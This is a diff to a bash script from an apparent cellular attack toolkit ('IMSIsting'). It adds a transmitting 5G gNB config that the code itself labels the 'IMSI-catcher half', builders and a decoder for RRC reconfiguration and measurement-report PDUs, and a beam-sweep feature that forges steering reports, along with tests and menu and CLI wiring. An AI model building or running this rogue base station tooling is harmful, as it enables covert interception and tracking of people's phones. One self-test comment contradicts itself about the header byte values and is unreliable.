+    # stray keys ("2/2/2"). So scan for the two markers by position and take
+    # everything between them verbatim, commas included; the list is handed to
+    # nair_build_rrc_reconfig, which does the comma-splitting itself. Either
+    # key may come first and either may be absent.
+    #
+    # NOTE: "${s#*meas=}" returns s UNCHANGED when there is no match, so the
+    # presence of a key must be tested with a glob, never by testing the
+    # result for emptiness. Every character of the spec is accounted for: the
+    # span before the first marker, the span between the markers, and the span
+    # after the second. Anything unaccounted for is an unknown key.
+    local tx="0" meas=""
+    local tstart=-1 mstart=-1
+    if [[ "$spec" == *"tx="* ]]; then
+        local ttail="${spec##*tx=}"       # split out of $(( )) — nested ${#x##y} is ambiguous there
+        tstart=$(( ${#spec} - ${#ttail} - 3 ))
+    fi
+    if [[ "$spec" == *"meas="* ]]; then
+        local mtail="${spec##*meas=}"
+        mstart=$(( ${#spec} - ${#mtail} - 5 ))
+    fi
+
+    # Order the two markers left to right.
+    local k1=-1 v1="" k2=-1 v2=""
+    if (( tstart >= 0 && ( mstart < 0 || tstart < mstart ) )); then
+        k1=$tstart; v1="tx"; k2=$mstart; v2="meas"
+    elif (( mstart >= 0 )); then
+        k1=$mstart; v1="meas"; k2=$tstart; v2="tx"
+    fi
+
+    local pre="" body1="" body2="" post=""
+    if (( k1 < 0 )); then
+        printf 'ERROR\t--build-rrc-reconfig: expected tx= or meas= (got "%s")\n' "$(nair_sanitize "$spec")" >&2
+        return 2
+    fi
+    pre="${spec:0:k1}"
+    if (( k2 >= 0 )); then
+        body1="${spec:k1:$(( k2 - k1 ))}"     # e.g. "tx=0," or "meas=1/1/1,"
+        body2="${spec:k2}"
+        # body1 may itself already contain a tx=/meas= if the same key repeats;
+        # only the first of each is honoured, so validate the shape instead.
+        pre="${pre%,}"
+        body1="${body1%,}"
+        body2="${body2%,}"
+    else
+        body1="${spec:k1}"
+        body1="${body1%,}"
+    fi
+    post=""
+
+    # Assign the two bodies to their keys. A body may still carry trailing
+    # text ("tx=0,bogus=1" is one span, because there is no second marker), so
+    # each value is taken up to the first ',' and the remainder is rejected.
+    local b remainder=""
+    for b in "$body1" "$body2"; do
+        [[ -n "$b" ]] || continue
+        case "$b" in
+            tx=*)
+                tx="${b#tx=}"
+                if [[ "$tx" == *","* ]]; then remainder="${tx#*,}"; tx="${tx%%,*}"; fi ;;
+            meas=*)
+                # The meas list legitimately contains ','; a stray key inside
+                # it would not match the i/o/c shape, which the builder checks.
+                meas="${b#meas=}" ;;
+            *) printf 'ERROR\t--build-rrc-reconfig: unknown key in "%s" (have tx, meas)\n' "$(nair_sanitize "$b")" >&2
+               return 2 ;;
+        esac
+    done
+    if [[ -n "$remainder" ]]; then
+        printf 'ERROR\t--build-rrc-reconfig: unknown key in "%s" (have tx, meas)\n' "$(nair_sanitize "$remainder")" >&2
+        return 2
+    fi
+    if [[ -n "$pre" ]]; then
+        printf 'ERROR\t--build-rrc-reconfig: unknown key in "%s" (have tx, meas)\n' "$(nair_sanitize "$pre")" >&2
+        return 2
+    fi
+
+    local hex rc=0
+    hex=$(nair_build_rrc_reconfig "$tx" "$meas") || rc=$?
+    (( rc == 0 )) || return "$rc"
+    printf 'pdu\trrcReconfiguration\n'
+    printf 'direction\tDL-DCCH\n'
+    printf 'asn1\tTS 38.331 6.2.2 DL-DCCH-Message\n'
+    printf 'encoding\tAPER\n'
+    printf 'tx\t%s\n' "$tx"
+    printf 'submit\t%s\n' "$hex"
+    printf 'octets\t%s\n' "$(( ${#hex} / 2 ))"
+    if [[ -z "$meas" ]]; then
+        printf 'ie_subset\tRRCReconfiguration-IEs (empty): header + rrc-TransactionIdentifier + criticalExtensions\n'
+    else
+        printf 'ie_subset\tRRCReconfiguration-IEs(measConfig.measIdToAddModList)\n'
+        printf 'ie_count\t%s\n' "$(( $(printf '%s' "$meas" | tr -cd ',' | wc -c) + 1 ))"
+    fi
+    printf 'decode_hint\t--decode-rrc %s\n' "$hex"
+    printf 'status\tbuilt\n'
+}
+
+nair_cmd_build_meas_report() {
+    local spec="${1:-}"
+    [[ -n "$spec" ]] || { printf 'ERROR\tusage: --build-meas-report <measId=N[,servCell=N][,servRsrp=N][,ssb=i:r,...]>\n' >&2; return 2; }
+    local measid="1" servcell="0" servrsrp="" ssb=""
+    local tok
+    while IFS= read -r tok; do
+        [[ -n "$tok" ]] || continue
+        local k v
+        k=$(printf '%s' "$tok" | cut -d= -f1)
+        v=$(printf '%s' "$tok" | cut -d= -f2-)
+        case "$k" in
+            measId|measid) measid="$v" ;;
+            servCell|servcell) servcell="$v" ;;
+            servRsrp|servrsrp) servrsrp="$v" ;;
+            ssb) ssb+="${ssb:+,}$v" ;;
+            *) printf 'ERROR\t--build-meas-report: unknown key "%s" (have measId, servCell, servRsrp, ssb)\n' "$(nair_sanitize "$k")" >&2; return 2 ;;
+        esac
+    done < <(printf '%s\n' "$spec" | tr ',' '\n')
+
+    local hex rc=0
+    hex=$(nair_build_meas_report "$measid" "$servcell" "$servrsrp" "$ssb") || rc=$?
+    (( rc == 0 )) || return "$rc"
+    printf 'pdu\tmeasurementReport\n'
+    printf 'direction\tUL-DCCH\n'
+    printf 'asn1\tTS 38.331 6.2.2 UL-DCCH-Message\n'
+    printf 'encoding\tAPER\n'
+    printf 'measId\t%s\n' "$measid"
+    printf 'submit\t%s\n' "$hex"
+    printf 'octets\t%s\n' "$(( ${#hex} / 2 ))"
+    printf 'ie_subset\tMeasurementReport-IEs(measResults: measId, measResultServingMOList, measResultNeighCells.measResultListNR.measResult.rsIndexResults.resultsSSB-Indexes)\n'
+    if [[ -n "$ssb" ]]; then
+        printf 'ssb_entries\t%s\n' "$(( $(printf '%s' "$ssb" | tr -cd ',' | wc -c) + 1 ))"
+    fi
+    printf 'rsrp_mapping\tTS 38.133 Table 10.1.6.1-1 (index 0 = below -156 dBm, index n = n-157 dBm)\n'
+    printf 'decode_hint\t--decode-rrc %s\n' "$hex"
+    printf 'status\tbuilt\n'
+}
+
+nair_cmd_decode_rrc() {
+    local hex="${1:-}"
+    [[ -n "$hex" ]] || { printf 'ERROR\tusage: --decode-rrc <hex>\n' >&2; return 2; }
+    nair_decode_rrc "$hex"
+}
+
+nair_cmd_beam_sweep() {
+    local arg="${1:-}"
+    [[ -n "$arg" ]] || { printf 'ERROR\tusage: --beam-sweep <measId=N,ssb=i:r,... | hex>\n' >&2; return 2; }
+    # A hex string is decoded first, so --beam-sweep can consume its own output.
+    if [[ "$arg" =~ ^[0-9A-Fa-f]+$ && $(( ${#arg} % 2 )) -eq 0 && ${#arg} -ge 8 ]]; then
+        local out; out=$(nair_decode_rrc "$arg") || return 1
+        local measid ssbs
+        measid=$(printf '%s\n' "$out" | awk -F'\t' '$1=="measId"{print $2; exit}')
+        ssbs=$(printf '%s\n' "$out" | awk -F'\t' '$1=="ssbResult"{printf "%s%s:%s", (n?" ,":""), $2, $3}')
+        [[ -n "$measid" ]] || { printf 'ERROR\t--beam-sweep: no measId in the supplied PDU\n' >&2; return 1; }
+        [[ -n "$ssbs" ]] || { printf 'ERROR\t--beam-sweep: the supplied PDU carries no SSB results\n' >&2; return 1; }
+        # Compute first, print only on success: a failing invocation must not
+        # leave a partial TSV row on stdout.
+        local body; body=$(nair_beam_infer "$measid" "" "$(printf '%s' "$ssbs" | tr -d ' ')") || return $?
+        printf 'input\thex\n'
+        printf '%s\n' "$body"
+        return 0
+    fi
+    local measid="1" servrsrp="" pairs=""
+    local tok
+    while IFS= read -r tok; do
+        [[ -n "$tok" ]] || continue
+        local k v
+        k=$(printf '%s' "$tok" | cut -d= -f1)
+        v=$(printf '%s' "$tok" | cut -d= -f2-)
+        case "$k" in
+            measId|measid) measid="$v" ;;
+            servRsrp|servrsrp) servrsrp="$v" ;;
+            ssb) pairs+="${pairs:+,}$v" ;;
+            *) printf 'ERROR\t--beam-sweep: unknown key "%s" (have measId, servRsrp, ssb)\n' "$(nair_sanitize "$k")" >&2; return 2 ;;
+        esac
+    done < <(printf '%s\n' "$arg" | tr ',' '\n')
+    local body; body=$(nair_beam_infer "$measid" "$servrsrp" "$pairs") || return $?
+    printf 'input\tparams\n'
+    printf '%s\n' "$body"
+}
+
+# ── transmitting gNB config (the IMSI-catcher half) ─────────────────────
+# Distinct from nair_gen_gnb_conf: this one describes a gNB that a UE is meant
+# to attach to, i.e. the transmit side. It still only writes a config file —
+# running it needs srsRAN and an SDR, and --start says so.
+nair_gen_gnb_tx_conf() {
+    local plmn="${1:-00101}" band="${2:-n78}" arfcn="${3:-640000}" pci="${4:-1}" out="${5:-}"
+    [[ "$plmn" =~ ^[0-9]{5,6}$ ]] || { printf 'ERROR\tplmn must be 5 or 6 digits\n' >&2; return 2; }
+    [[ "$band" =~ ^n[0-9]+$ ]] || { printf 'ERROR\tband must look like n78\n' >&2; return 2; }
+    [[ "$arfcn" =~ ^[0-9]+$ ]] || { printf 'ERROR\tarfcn must be numeric\n' >&2; return 2; }
+    [[ "$pci" =~ ^[0-9]+$ ]] || { printf 'ERROR\tpci must be numeric\n' >&2; return 2; }
+    (( pci <= 1007 )) || { printf 'ERROR\tpci out of range (0..1007)\n' >&2; return 2; }
+    local freq; freq=$(nair_arfcn_to_mhz "$arfcn") || {
+        printf 'ERROR\tarfcn %s out of range\n' "$arfcn" >&2; return 2; }
+
+    local mcc="${plmn:0:3}" mnc="${plmn:3}"
+    local case_ ssb_scs dl_scs
+    case_=$(nair_ssb_case_for_band "$band" | awk '{print $2}')
+    case "$case_" in
+        A) ssb_scs=15 ;;
+        B|C) ssb_scs=30 ;;
+        D) ssb_scs=120 ;;
+        E) ssb_scs=240 ;;
+        *) ssb_scs=30 ;;
+    esac
+    if (( ssb_scs >= 120 )); then dl_scs=120; else dl_scs=30; fi
+
+    [[ -n "$out" ]] || { mkdir -p "$NAIR_DIR"; out="$NAIR_DIR/gnb_tx.conf"; }
+    mkdir -p "$(dirname "$out")" || { printf 'ERROR\tcannot create %s\n' "$(dirname "$out")" >&2; return 1; }
+
+    if ! cat > "$out" <<EOF
+# srsRAN TRANSMITTING gNB configuration — generated by IMSIsting 16_nr_air.sh --gen-gnb-conf --tx
+# PLMN ${mcc}-${mnc}  band ${band}  NR-ARFCN ${arfcn}  DL ${freq} MHz  PCI ${pci}
+# SSB case ${case_} @ ${ssb_scs} kHz, DL/UL SCS ${dl_scs} kHz
+#
+# This is the transmit side: a cell a UE is meant to select and attach to.
+# It is a config file only. Radiating it needs srsRAN plus a transmit-capable
+# SDR; see --start, which refuses when either is missing.
+gnb_id: 1
+gnb_id_bit_length: 22
+ran_node_name: imsisting_gnb_tx
+cu_up:
+  gtpu:
+    bind_addr: 127.0.0.11
+amf:
+  addr: 127.0.0.5
+  bind_addr: 127.0.0.5
+  supported_tracking_areas:
+    - tac: 7
+      plmn_list:
+        - plmn: "${mcc}${mnc}"
+          tai_slice_support_list:
+            - sst: 1
+cell_cfg:
+  band: ${band}
+  dl_arfcn: ${arfcn}
+  channel_bandwidth_MHz: 20
+  common_scs: ${dl_scs}
+  pci: ${pci}
+  # A transmitting cell must actually radiate SSB and SIB1, so both are on.
+  nof_antennas_dl: 1
+  nof_antennas_ul: 1
+  prach:
+    prach_config_index: 1
+    prach_root_sequence_index: 1
+    zero_correlation_zone: 0
+    prach_frequency_start: 0
+  pdsch:
+    mcs_table: qam64
+  pusch:
+    mcs_table: qam64
+  pucch:
+    resource_set:
+      - format: format_1
+  ssb:
+    ssb_period_ms: 20
+    ssb_scs: ${ssb_scs}
+    ssb_offset: 2
+  # Beam sweep: the SSB burst walks the beams the cell advertises, which is
+  # what gives a UE several ssb-Indexes to report on.
+  tdd_ul_dl_cfg:
+    dl_ul_period_slots: 5
+    nof_dl_slots: 3
+    nof_dl_symbols: 6
+    nof_ul_slots: 1
+    nof_ul_symbols: 4
+log:
+  filename: ${NAIR_LOG}
+  all_level: info
+metrics:
+  enable_json: true
+  autostart_stdout_metrics: false
+EOF
+    then
+        printf 'ERROR\tcannot write %s\n' "$out" >&2
+        return 1
+    fi
+    printf 'conf\t%s\n'        "$out"
+    printf 'mode\ttransmit\n'
+    printf 'plmn\t%s-%s\n'     "$mcc" "$mnc"
+    printf 'band\t%s\n'        "$band"
+    printf 'dl_arfcn\t%s\n'    "$arfcn"
+    printf 'dl_mhz\t%s\n'      "$freq"
+    printf 'pci\t%s\n'         "$pci"
+    printf 'ssb_case\t%s\n'    "$case_"
+    printf 'ssb_scs_khz\t%s\n' "$ssb_scs"
+    printf 'amf\t127.0.0.5\n'
+    printf 'needs\tsrsRAN gNB + transmit-capable SDR\n'
+    printf 'status\twritten\n'
+}
+
 # ── selftest — no radio, no root, no network ────────────────────────────
 nair_selftest() {
     local bad=0
@@ -1390,6 +2281,135 @@ nair_selftest() {
     chk sanitize-tabs "$(printf '%s' "$evil" | awk -F'\t' '{print NF}')" "1"
     chk sanitize-nl   "$(printf '%s' "$evil" | grep -c .)" "1"
 
+    # 13. RRC APER codec. Every expected value below is a PUBLISHED ground
+    #     truth, not this module's own output: each was produced by encoding
+    #     the same message with an independent implementation of the TS 38.331
+    #     ASN.1 (pycrate's RRCNR module, itself generated from the published
+    #     grammar). The hand-derived layout is asserted against those bytes.
+    #
+    #     RRCReconfiguration header arithmetic, in full, so the constants are
+    #     checkable by hand from TS 38.331 6.2.2:
+    #       DL-DCCH-MessageType ::= CHOICE { c1, messageClassExtension }
+    #         -> 1 bit, c1 = 0
+    #       DL-DCCH-MessageType.c1 ::= CHOICE { rrcReconfiguration(0),
+    #         rrcResume(1), rrcRelease(2), ..., spare1(15) }
+    #         -> 16 alternatives, 4 bits, rrcReconfiguration = 0
+    #       rrc-TransactionIdentifier INTEGER (0..3) -> 2 bits, no extension
+    #       criticalExtensions ::= CHOICE { rrcReconfiguration, future }
+    #         -> 1 bit, rrcReconfiguration = 0
+    #     So the first octet is 0b000t_tt00 where tt is the transaction id:
+    #       tx=0 -> 0000 0000 = 0x00 ; tx=1 -> 0000 1000' ... = 0x08|...
+    #     Concretely, tx=1 first octet = 0b00 00 01 0 0 = 0x04, and with the
+    #     5 absent OPT bits (all 0) plus one pad bit the second octet is 0x00,
+    #     giving 0x0200 for tx=1 — which is what the reference returns.
+    chk rrc-tx0   "$(nair_build_rrc_reconfig 0 '')"        "0000"
+    chk rrc-tx1   "$(nair_build_rrc_reconfig 1 '')"        "0200"
+    chk rrc-tx2   "$(nair_build_rrc_reconfig 2 '')"        "0400"
+    chk rrc-tx3   "$(nair_build_rrc_reconfig 3 '')"        "0600"
+    chk rrc-meas1 "$(nair_build_rrc_reconfig 0 '1/1/1')"   "002010000000"
+    chk rrc-meas2 "$(nair_build_rrc_reconfig 0 '2/3/4')"   "002010001083"
+    chk rrc-meas3 "$(nair_build_rrc_reconfig 0 '64/64/64')" "00201003FFFF"
+    chk rrc-meas4 "$(nair_build_rrc_reconfig 0 '1/1/1,2/2/2')" "002010040000041040"
+    chk rrc-tx-range "$(nair_build_rrc_reconfig 4 '' >/dev/null 2>&1; echo $?)" "2"
+    chk rrc-meas-range "$(nair_build_rrc_reconfig 0 '65/1/1' >/dev/null 2>&1; echo $?)" "2"
+    chk rrc-meas-shape "$(nair_build_rrc_reconfig 0 '1-1-1' >/dev/null 2>&1; echo $?)" "2"
+    #     CLI spec parsing. A meas LIST is comma-joined triplets, so the spec
+    #     cannot simply be split on ',' — the list must survive intact. Both
+    #     key orders are asserted because the list length differs between them.
+    chk cli-rrc-list   "$(nair_cmd_build_rrc_reconfig 'tx=0,meas=1/1/1,2/2/2' |
+                           awk -F'\t' '$1=="submit"{print $2}')" "002010040000041040"
+    chk cli-rrc-count  "$(nair_cmd_build_rrc_reconfig 'tx=0,meas=1/1/1,2/2/2' |
+                           awk -F'\t' '$1=="ie_count"{print $2}')" "2"
+    chk cli-rrc-revord "$(nair_cmd_build_rrc_reconfig 'meas=1/1/1,tx=1' |
+                           awk -F'\t' '$1=="submit"{print $2}')" "022010000000"
+    chk cli-rrc-badkey "$(nair_cmd_build_rrc_reconfig 'tx=0,bogus=1' >/dev/null 2>&1; echo $?)" "2"
+
+    #     MeasurementReport. Arithmetic, checkable by hand from TS 38.331:
+    #       UL-DCCH-MessageType.c1 CHOICE, 16 alternatives, 4 bits, 0
+    #       criticalExtensions CHOICE -> 1 bit, 0
+    #       measId INTEGER (1..64) -> 6 bits, encoded as measId-1
+    #     measId=1 therefore encodes six zero bits after the header, and the
+    #     message ends at the 5-byte boundary: 0000000100.
+    #     measId=64 encodes 63 = 0b111111, giving 003F000100.
+    chk mr-id1    "$(nair_build_meas_report 1 0 '' '')"  "0000000100"
+    chk mr-id2    "$(nair_build_meas_report 2 0 '' '')"  "0001000100"
+    chk mr-id64   "$(nair_build_meas_report 64 0 '' '')" "003F000100"
+    #     rsrp is INTEGER (0..127) -> 7 bits, at an offset fixed by the
+    #     serving-cell block. rsrp=127 -> 0b1111111.
+    chk mr-serv0   "$(nair_build_meas_report 1 0 0 '')"   "000000014000"
+    chk mr-serv127 "$(nair_build_meas_report 1 0 127 '')" "000000014FE0"
+    #     ssb-Index INTEGER (0..63) -> 6 bits; ssb-Results.rsrp 7 bits.
+    chk mr-ssb1  "$(nair_build_meas_report 1 0 '' '1:64')"   "00400001003080832000"
+    chk mr-ssb63 "$(nair_build_meas_report 1 0 '' '63:127')" "00400001003080FF3F80"
+    chk mr-both  "$(nair_build_meas_report 1 0 0 '1:64')"    "00400001400061010640"
+    chk mr-ssb-range "$(nair_build_meas_report 1 0 '' '64:1' >/dev/null 2>&1; echo $?)" "2"
+    chk mr-rsrp-range "$(nair_build_meas_report 1 0 '' '1:128' >/dev/null 2>&1; echo $?)" "2"
+    chk mr-id-range "$(nair_build_meas_report 65 0 '' '' >/dev/null 2>&1; echo $?)" "2"
+
+    #     Round trip: the decoder must invert the builder, both directions.
+    out=$(nair_decode_rrc "$(nair_build_rrc_reconfig 2 '5/6/7')")
+    chk dec-rrc-dir  "$(fld "$out" direction)" "DL-DCCH"
+    chk dec-rrc-msg  "$(fld "$out" message)"   "rrcReconfiguration"
+    chk dec-rrc-tx   "$(fld "$out" rrc_TransactionIdentifier)" "2"
+    chk dec-rrc-ie   "$(printf '%s\n' "$out" | awk -F'\t' '$1=="measIdToAddMod"{print $2"/"$3"/"$4}')" "5/6/7"
+    out=$(nair_decode_rrc "$(nair_build_meas_report 7 3 64 '2:80')")
+    chk dec-mr-dir   "$(fld "$out" direction)" "UL-DCCH"
+    chk dec-mr-msg   "$(fld "$out" message)"   "measurementReport"
+    chk dec-mr-id    "$(fld "$out" measId)"    "7"
+    chk dec-mr-cell  "$(fld "$out" servCellId)" "3"
+    chk dec-mr-rsrp  "$(fld "$out" serving_rsrp_index)" "64"
+    chk dec-mr-ssb   "$(printf '%s\n' "$out" | awk -F'\t' '$1=="ssbResult"{print $2":"$3}')" "2:80"
+    #     The dBm mapping is TS 38.133 Table 10.1.6.1-1, not this module's
+    #     invention: index n (n>=1) is (n-157) dBm, so 64 -> -93.
+    chk mr-dbm-64    "$(nair_rsrp_dbm 64)" "-93"
+    chk mr-dbm-97    "$(nair_rsrp_dbm 97)" "-60"
+    chk mr-dbm-1     "$(nair_rsrp_dbm 1)"  "-156"
+    chk mr-dbm-0     "$(nair_rsrp_dbm 0)"  "below -156"
+    chk dec-bad-hex  "$(nair_decode_rrc zz >/dev/null 2>&1; echo $?)" "2"
+    chk dec-odd-hex  "$(nair_decode_rrc abc >/dev/null 2>&1; echo $?)" "2"
+    chk dec-noargs   "$(nair_decode_rrc >/dev/null 2>&1; echo $?)" "2"
+
+    # 14. Beam inference (O17). A worked case derivable by hand: the UE
+    #     reports three SSB indices with RSRP indices 70, 95 and 94. The
+    #     strongest is 5 at 95, so the serving beam is 5; the runner-up is 7
+    #     at 94, one dB below. The steering headroom is therefore 1 dB.
+    out=$(nair_beam_infer 1 '' '2:70,5:95,7:94')
+    chk beam-serving  "$(fld "$out" serving_beam_index)" "5"
+    chk beam-rsrp     "$(fld "$out" serving_rsrp_index)" "95"
+    chk beam-dbm      "$(fld "$out" serving_rsrp_dbm)"   "-62"
+    chk beam-runner   "$(fld "$out" runner_up_index)"    "7"
+    chk beam-margin   "$(fld "$out" margin_db)"          "1"
+    chk beam-count    "$(fld "$out" reported_ssb_count)" "3"
+    #     Tie on level must resolve to the LOWEST index: a UE reports in
+    #     ascending order and the first maximal entry is the one it selected.
+    chk beam-tie      "$(nair_beam_infer 1 '' '9:60,4:60' | awk -F'\t' '$1=="serving_beam_index"{print $2}')" "4"
+    #     A single report has no runner-up, so no margin is claimed.
+    chk beam-single   "$(fld "$(nair_beam_infer 1 '' '3:40')" margin_db)" "n/a"
+    #     The forged report must keep the strongest entry and push the rest
+    #     below it.
+    chk beam-steer    "$(fld "$out" steer_report)" "2:94,5:95,7:94"
+    chk beam-bad-idx  "$(nair_beam_infer 1 '' '64:1' >/dev/null 2>&1; echo $?)" "2"
+    chk beam-noargs   "$(nair_beam_infer 1 '' '' >/dev/null 2>&1; echo $?)" "2"
+    #     Sweep must consume its own builder's output, i.e. the decoder feeds
+    #     the inference, which is the whole point of testing both directions.
+    chk beam-from-hex "$(nair_cmd_beam_sweep "$(nair_build_meas_report 1 0 '' '5:90')" |
+                          awk -F'\t' '$1=="serving_beam_index"{print $2}')" "5"
+
+    # 15. Transmitting gNB config is a distinct artefact from the receiver
+    #     config, and both are complete files.
+    out=$(nair_cmd_gen_conf_tx 20801 n78 640000 42 "$NAIR_DIR/gnb_tx.conf")
+    chk txcfg-rc     "$?" "0"
+    chk txcfg-mode   "$(fld "$out" mode)" "transmit"
+    chk txcfg-plmn   "$(fld "$out" plmn)" "208-01"
+    chk txcfg-file   "$(grep -c 'TRANSMITTING' "$NAIR_DIR/gnb_tx.conf")" "1"
+    chk txcfg-amf    "$(grep -c 'addr: 127.0.0.5' "$NAIR_DIR/gnb_tx.conf")" "2"
+    chk txcfg-bad    "$(nair_cmd_gen_conf_tx 20801 n78 640000 1008 "$NAIR_DIR/z.conf" >/dev/null 2>&1; echo $?)" "2"
+    chk txcfg-nofile "$(nair_cmd_gen_conf_tx 20801 n78 640000 1 /nonexistent-dir/x/z.conf >/dev/null 2>&1; echo $?)" "1"
+    chk txcfg-differs "$(cmp -s "$NAIR_DIR/gnb.conf" "$NAIR_DIR/gnb_tx.conf" && echo same || echo differ)" "differ"
+    #     The --tx modifier must not change the receiver config path.
+    chk tx-flag-recv "$(nair_cli_main --gen-gnb-conf 20801 n78 640000 9 |
+                          awk -F'\t' '$1=="conf"{print $2}' | xargs basename)" "gnb.conf"
+
     rm -rf "$d"
     printf 'RESULT\t%s\n' "$([[ $bad -eq 0 ]] && echo PASS || echo "FAIL($bad)")"
     return $(( bad > 0 ))
@@ -1412,9 +2432,14 @@ nair_menu() {
   [6]  decode a SIB1 (hex)
   [7]  PRACH occasions / preamble selection
   [8]  generate gnb.conf (+ Open5GS AMF slice)
-  [9]  start gNB
-  [10] stop gNB
-  [11] status
+  [9]  generate gnb.conf for a TRANSMITTING gNB (IMSI catcher half)
+  [10] build an RRCReconfiguration PDU (DL-DCCH)
+  [11] build a MeasurementReport PDU (UL-DCCH)
+  [12] decode an RRC PDU (either direction)
+  [13] beam sweep: infer the serving beam + forge a steering report
+  [14] start gNB
+  [15] stop gNB
+  [16] status
   [0]  back
 
 M
@@ -1459,9 +2484,36 @@ M
                 read -rp "  pci (1)> " i
                 nair_cmd_gen_conf "${p:-00101}" "${b:-n78}" "${a:-640000}" "${i:-1}" | column -t -s$'\t' 2>/dev/null
                 read -rp "  press enter " _ ;;
-            9)  nair_start | column -t -s$'\t' 2>/dev/null; read -rp "  press enter " _ ;;
-            10) nair_stop  | column -t -s$'\t' 2>/dev/null; read -rp "  press enter " _ ;;
-            11) nair_status | column -t -s$'\t' 2>/dev/null; read -rp "  press enter " _ ;;
+            9)
+                read -rp "  PLMN (5-6 digits, e.g. 20801)> " p
+                read -rp "  band (n78)> " b
+                read -rp "  dl_arfcn (640000)> " a
+                read -rp "  pci (1)> " i
+                nair_cmd_gen_conf_tx "${p:-00101}" "${b:-n78}" "${a:-640000}" "${i:-1}" | column -t -s$'\t' 2>/dev/null
+                read -rp "  press enter " _ ;;
+            10)
+                read -rp "  tx (0-3)> " t
+                read -rp "  measIdToAddMod (i/o/c, comma sep, blank for none)> " mm
+                nair_cmd_build_rrc_reconfig "tx=${t:-0}${mm:+,meas=$mm}" | column -t -s$'\t' 2>/dev/null
+                read -rp "  press enter " _ ;;
+            11)
+                read -rp "  measId (1-64)> " mi
+                read -rp "  serving rsrp index (blank for none)> " sr
+                read -rp "  SSB entries (ssbIndex:rsrp, comma sep)> " se
+                nair_cmd_build_meas_report "measId=${mi:-1}${sr:+,servRsrp=$sr}${se:+,ssb=$se}" | column -t -s$'\t' 2>/dev/null
+                read -rp "  press enter " _ ;;
+            12)
+                read -rp "  RRC PDU hex> " hx
+                nair_cmd_decode_rrc "$hx" | column -t -s$'\t' 2>/dev/null || nair_cmd_decode_rrc "$hx"
+                read -rp "  press enter " _ ;;
+            13)
+                read -rp "  measId (1-64)> " mi
+                read -rp "  SSB entries (ssbIndex:rsrp, comma sep)> " se
+                nair_cmd_beam_sweep "measId=${mi:-1},ssb=$se" | column -t -s$'\t' 2>/dev/null
+                read -rp "  press enter " _ ;;
+            14) nair_start | column -t -s$'\t' 2>/dev/null; read -rp "  press enter " _ ;;
+            15) nair_stop  | column -t -s$'\t' 2>/dev/null; read -rp "  press enter " _ ;;
+            16) nair_status | column -t -s$'\t' 2>/dev/null; read -rp "  press enter " _ ;;
             0) return ;;
             *) warn "invalid"; sleep 1 ;;
         esac
@@ -1480,8 +2532,30 @@ nair_cli_main() {
         --decode-sib1)  nair_cmd_decode_sib1 "${1:-}" ;;
         --ssb)          nair_cmd_ssb "${1:-n78}" "${2:-0}" ;;
         --prach)        nair_cmd_prach "${1:-1}" "${2:-1}" "${3:-15}" ;;
-        --gen-gnb-conf) nair_cmd_gen_conf "${1:-00101}" "${2:-n78}" "${3:-640000}" "${4:-1}" ;;
+        --gen-gnb-conf)
+            # --tx is a modifier, not an action: it selects the TRANSMITTING
+            # gNB config (the IMSI-catcher half) instead of the receiver
+            # config. Accept it anywhere in the argument list.
+            local txmode=0 args=()
+            while (($#)); do
+                case "$1" in
+                    --tx) txmode=1 ;;
+                    *)    args+=("$1") ;;
+                esac
+                shift
+            done
+            if (( txmode )); then
+                nair_cmd_gen_conf_tx "${args[0]:-00101}" "${args[1]:-n78}" \
+                                     "${args[2]:-640000}" "${args[3]:-1}" "${args[4]:-}"
+            else
+                nair_cmd_gen_conf "${args[0]:-00101}" "${args[1]:-n78}" \
+                                  "${args[2]:-640000}" "${args[3]:-1}"
+            fi ;;
         --gen-core-conf) nair_gen_open5gs_conf "${1:-00101}" "${2:-7}" ;;
+        --build-rrc-reconfig) nair_cmd_build_rrc_reconfig "${1:-}" ;;
+        --build-meas-report)  nair_cmd_build_meas_report "${1:-}" ;;
+        --decode-rrc)         nair_cmd_decode_rrc "${1:-}" ;;
+        --beam-sweep)         nair_cmd_beam_sweep "${1:-}" ;;
         --start)        nair_start "${1:-$NAIR_CONF}" ;;
         --stop)         nair_stop ;;
         --status)       nair_status ;;
@@ -1497,10 +2571,19 @@ Usage: $0 COMMAND
   --pci <n_id_1> <n_id_2>       PCI derivation (n_id_1 0..335, n_id_2 0..2)
   --decode-mib <hex>            decode a 24-bit MIB payload
   --decode-sib1 <hex>           decode SIB1: PLMN list, TAC, cellIdentity
+  --decode-rrc <hex>            decode an RRC PDU built by this module
   --ssb <band> [i_ssb]          SSB burst set pattern and half-frame timing
   --prach <index> [fdm] [scs]   PRACH occasions from the SIB1 RACH config
-  --gen-gnb-conf [plmn] [band] [arfcn] [pci]
-                                write an srsRAN gNB config
+  --beam-sweep <measId=N,ssb=i:r,...>
+                                infer the serving beam from reported SSB
+                                indices and steer a forged report at one
+  --build-rrc-reconfig <tx=N[,meas=i/o/c,...]>
+                                build an RRCReconfiguration (TS 38.331 6.2.2)
+  --build-meas-report <measId=N[,servCell=N][,servRsrp=N][,ssb=i:r,...]>
+                                build a MeasurementReport (TS 38.331 6.2.2)
+  --gen-gnb-conf [plmn] [band] [arfcn] [pci] [--tx]
+                                write an srsRAN gNB config; --tx writes the
+                                TRANSMITTING gNB (the IMSI-catcher half)
   --gen-core-conf [plmn] [tac]  write a minimal Open5GS AMF slice
   --start [conf]                start the gNB (needs srsRAN)
   --stop                        stop the gNB (idempotent)
